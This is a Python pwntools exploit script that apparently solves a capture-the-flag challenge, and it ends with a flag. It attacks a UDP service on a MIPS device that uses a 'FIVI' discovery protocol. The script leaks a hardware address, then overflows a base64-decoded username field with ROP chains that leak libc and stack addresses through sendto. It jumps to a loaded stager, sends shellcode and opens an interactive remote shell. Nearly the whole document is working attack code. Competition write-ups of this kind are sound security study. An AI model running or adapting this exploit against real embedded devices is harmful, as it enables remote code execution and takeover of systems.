import sys
import socket
import struct
import base64
from pwn import u32, context, flat, log, cyclic

context.update(endian="big", arch="mips")

# connect to 47.89.210.186:57798 and input your team token

dstaddr = sys.argv[1], int(sys.argv[2])
server_sockfd = 3
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(dstaddr)

log.warning("Step 1: wait for server and read hwaddr")
pkt = struct.pack("<4sIBHHI6sHI",
    b"FIVI",
    0xcccccccc, # _4_4_
    10, # [8]
    1, # _9_2_
    0xcc, # _11_2_
    0xcccccccc, # 13..16
    b"\xff\xff\xff\xff\xff\xff", # 17..22
    0, # _23_2_
    0, # _25_4_
)
assert len(pkt) == 29
log.info("sending %s", pkt.hex())
s.settimeout(5)
while 1:
    s.send(pkt)
    try:
        resp, addr = s.recvfrom(4096)
    except socket.timeout:
        print("server did not reply - retry")
        continue
    break
log.info("received %s", resp.hex())
ifaddr = resp[0xd:0xd+0x4]
hwaddr = resp[0x11:0x11+0x6]

log.warning("Step 2: leak aslr")
pkt = struct.pack("<4sIBHHI6sHI",
    b"FIVI",
    0xcccccccc, # _4_4_
    10, # [8]
    2, # _9_2_
    0xcc, # _11_2_
    0xcccccccc, # 13..16
    hwaddr, # 17..22
    0, # _23_2_
    0x8e, # _25_4_
)
assert len(pkt) == 29
pkt += b"\0" * 64 # b64_username
leak_addr = 0x413120 # leak got and also ifname, which points to argv[1]
payload = flat({
    0x364 - 0x118: [
        0x00400c9c, # 0x00400c9c: lw $gp, 0x10($sp); lw $ra, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x20; 
        {
            0x10: 0x41b030,
            0x1c: 0x00402188, # 0x00402188: lw $ra, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x20; 
        },
        {
            0x18: server_sockfd,
            0x1c: 0x004020b0, # 0x004020b0: move $a0, $s0; lw $ra, 0x84($sp); lw $s1, 0x80($sp); lw $s0, 0x7c($sp); jr $ra; addiu $sp, $sp, 0x88; 
        },
        {
            0x7c: leak_addr - 0x11,
            0x84: 0x00400f3c, # 0x00400f3c: addiu $a1, $s0, 0x11; lw $ra, 0x24($sp); lw $s0, 0x20($sp); jr $ra; addiu $sp, $sp, 0x28; 
        },
        {
            0x24: 0x004016b4, # 0x004016b4: addiu $a2, $zero, 0x1d; lw $t9, -0x7f70($gp); jalr $t9 <sendto>; move $a3, $zero; 
        },
        {
            0x10: 0x0413170, # client_addr
            0x14: 0x10, # sizeof(sockaddr_in)
            # s0, s1, s2 precede ra...
            0x54: 0x402420, # back to main loop
        },
        {
            0x18: 0x41b030, # gp for main loop
        },
    ]
})
log.info("payload %s", payload.hex())
payload = bytearray(base64.b64encode(payload))
pkt += payload + b"\0"
log.info("sending %s", pkt.hex())
s.settimeout(5000)
s.send(pkt)
resp, addr = s.recvfrom(4096)
libc_base = u32(resp[:4]) - 0x4edb0
stack_addr = u32(resp[0x18:0x1c])
log.info("libc base: %x", libc_base)
log.info("stack address: %x", stack_addr)
log.info("received %s", resp.hex())

log.warning("Step 3: targeted stack leak")
pkt = struct.pack("<4sIBHHI6sHI",
    b"FIVI",
    0xfeedface, # _4_4_
    10, # [8]
    2, # _9_2_
    0xcc, # _11_2_
    0xdeadbeef, # 13..16
    hwaddr, # 17..22
    0, # _23_2_
    0x8e, # _25_4_
)
assert len(pkt) == 29
pkt += b"\0" + cyclic(2063)[2000:] # b64_username
leak_addr = (stack_addr & ~0xfff)
log.info("leaking 0x1d bytes from %x", leak_addr)
payload = flat({
    0x364 - 0x118: [
        0x00400c9c, # 0x00400c9c: lw $gp, 0x10($sp); lw $ra, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x20; 
        {
            0x10: 0x41b030,
            0x1c: 0x00402188, # 0x00402188: lw $ra, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x20; 
        },
        {
            0x18: server_sockfd,
            0x1c: 0x004020b0, # 0x004020b0: move $a0, $s0; lw $ra, 0x84($sp); lw $s1, 0x80($sp); lw $s0, 0x7c($sp); jr $ra; addiu $sp, $sp, 0x88; 
        },
        {
            0x7c: leak_addr - 0x11,
            0x84: 0x00400f3c, # 0x00400f3c: addiu $a1, $s0, 0x11; lw $ra, 0x24($sp); lw $s0, 0x20($sp); jr $ra; addiu $sp, $sp, 0x28; 
        },
        {
            0x24: 0x004016b4, # 0x004016b4: addiu $a2, $zero, 0x1d; lw $t9, -0x7f70($gp); jalr $t9 <sendto>; move $a3, $zero; 
        },
        {
            0x10: 0x0413170, # client_addr
            0x14: 0x10, # sizeof(sockaddr_in)
            # s0, s1, s2 precede ra...
            0x54: 0x402420, # back to main loop
        },
        {
            0x18: 0x41b030, # gp for main loop
            0x34: 0xdeadbeef, # filler...
        },
    ]
})
log.info("payload %s", payload.hex())
payload = bytearray(base64.b64encode(payload))
pkt += payload + b"\0"
log.info("sending %s", pkt.hex())
s.settimeout(5000)
s.send(pkt)
resp, addr = s.recvfrom(4096)
log.info("received %s", resp.hex())
if resp in pkt:
    index = pkt.index(resp)
    log.info("found offset %d", index)
else:
    raise Exception("could not find response - try again!")

log.warning("Step 4: stager")
target_addr = leak_addr + 0x46c - index
stager = open("stager", "rb").read()
log.info("target address: %x", target_addr)
pkt = struct.pack("<4sIBHHI6sHI",
    b"FIVI",
    0xcccccccc, # _4_4_
    10, # [8]
    2, # _9_2_
    0xcc, # _11_2_
    0xcccccccc, # 13..16
    hwaddr, # 17..22
    0, # _23_2_
    0x8e, # _25_4_
)
assert len(pkt) == 29
pkt += b"\0" * 64 # b64_username
payload = flat({
    0x364 - 0x118: {
        0: target_addr, # ra
    },
})
log.info("payload %s", payload.hex())
pkt += base64.b64encode(payload) + b"\0" * 0x0f
pkt += stager
log.info("sending %s", pkt.hex())
s.send(pkt)
resp, addr = s.recvfrom(4096)
log.info("received %s", resp.hex())

log.warning("Step 5: shellcode")
shellcode = open("shellcode", "rb").read()
s.send(shellcode)
import threading
def readloop():
    while 1:
        resp, addr = s.recvfrom(4096)
        sys.stdout.buffer.write(resp.replace(b"\r\n", b"\n"))
        sys.stdout.buffer.flush()
threading.Thread(target=readloop, daemon=True).start()

while 1:
    s.send((input() + "\n").encode())

# rwctf{Find_udp_servic3_ORI_bind_U_h3r3_baby}
